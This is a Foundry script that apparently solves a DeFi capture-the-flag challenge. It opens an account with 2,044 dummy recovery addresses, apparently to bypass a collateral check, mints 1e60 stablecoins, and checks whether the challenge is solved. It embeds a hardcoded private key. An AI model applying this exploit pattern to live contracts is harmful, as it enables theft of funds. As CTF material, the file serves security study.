// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/Vm.sol";
import "../test/DAI.t.sol";

contract DaiScript is Script {
    Challenge challenge =
        Challenge(address(0xB13df483bc30fC0F425Ff22afe6B4358548CFfb8));
    uint deployerPrivateKey =
        0x81c2afbea8b00f6ac7145b9c9a6499e1ae282bad9f5efce3208d1cac4bd4b2a8;

    SystemConfiguration public configuration;
    AccountManager public manager;

    function setUp() public {
        configuration = SystemConfiguration(challenge.SYSTEM_CONFIGURATION());
        manager = AccountManager(configuration.getAccountManager());
    }

    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(
            deployerPrivateKey,
            "attacker"
        );
        address owner = wallet.addr;
        console.log("attacker wallet: ", wallet.addr);
        console.log("balance: %e", address(wallet.addr).balance);

        vm.startBroadcast(deployerPrivateKey);
        ////////////////
        address[] memory recoveries2 = new address[](2044);
        for (uint i = 0; i < recoveries2.length; i++) {
            recoveries2[i] = address(uint160(i));
        }

        Acct newAcc = manager.openAccount(owner, recoveries2);
        manager.mintStablecoins(newAcc, 1e60, "");

        console.log("is solved: ", challenge.isSolved());
        ////////////////
        vm.stopBroadcast();
    }
}
